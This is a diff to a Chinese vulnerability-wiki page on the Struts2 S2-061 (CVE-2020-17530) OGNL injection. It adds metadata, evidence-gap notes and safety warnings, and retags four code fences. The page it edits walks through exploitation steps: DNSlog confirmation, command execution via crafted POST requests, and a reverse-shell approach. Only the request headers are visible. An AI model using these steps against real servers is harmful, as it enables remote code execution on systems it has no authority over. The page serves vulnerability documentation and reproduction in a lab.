@@ -1,9 +1,55 @@
 ---
 cve: "CVE-2020-17530"
 source: "白阁文库 BaizeSec/bylibrary"
+title: "Struts2-061"
+product: "Apache Struts2标签OGNL"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "CVE-2020-17530; S2-061"
+referenced_identifiers: "S2-059"
+identifier_role: "primary"
+prerequisites: "2.0–2.5.25，双重求值标签；Tomcat InstanceManager与CommonsCollections BeanMap/FreeMarker实际类路径"
+source_status: "unknown"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
+id: "vw-d66c3d54cc6b62fd16c740e2"
+entity_id: "ve-d66c3d54cc6b62fd16c740e2"
+schema_version: "1"
 ---
 
 # Struts2-061
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：2.0–2.5.25，双重求值标签；Tomcat InstanceManager与CommonsCollections BeanMap/FreeMarker实际类路径
+- 证据范围：特别指出BeanMap不在最小依赖包，是有价值的利用前提；修复2.5.26和避免不可信求值已给。
+
+### 本次正文校订
+
+- 按实际内容修正 4 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- multipart边界后多空行使Content-Disposition可能成为body内容，应恢复请求格式
+- 缺BeanMap只能阻断本篇链，不能断言所有OGNL注入都无法利用
+- 反弹编码目标与所列靶机同IP，需明确同机实验或更正
+- DNS命令可持续ping，不能仅DNS结果泛化所有命令能力
+- 2.5.26为该编号初次修复，需关联062后续而非当前完整安全保证
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 ###   Struts2-061
 
@@ -36,7 +82,7 @@ http://192.168.1.14:8080/index.action
 1.DNSlog验证漏洞
 ```
 
-```
+```http
 POST /index.action HTTP/1.1
 Host: 192.168.1.14:8080
 Accept-Encoding: gzip, deflate
@@ -62,7 +108,7 @@ DNGlog记录可发现命令成功执行
 
 2.通过构造post包执行exp 命令执行id
 
-```
+```http
 POST /index.action HTTP/1.1
 Host: 192.168.1.14:8080
 Accept-Encoding: gzip, deflate
@@ -88,7 +134,7 @@ burp提交后，在响应页面发现命令回显可，说明ID命令执行成�
 
 或者
 
-```
+```http
 POST /index.action HTTP/1.1
 Host: 192.168.1.14:8080
 Accept-Encoding: gzip, deflate
@@ -140,7 +186,7 @@ http://www.jackson-t.ca/runtime-exec-payloads.html
 
 提交以下poc:
 
-```
+```http
 POST /index.action HTTP/1.1
 Host: 192.168.1.14:8080
 Accept-Encoding: gzip, deflate
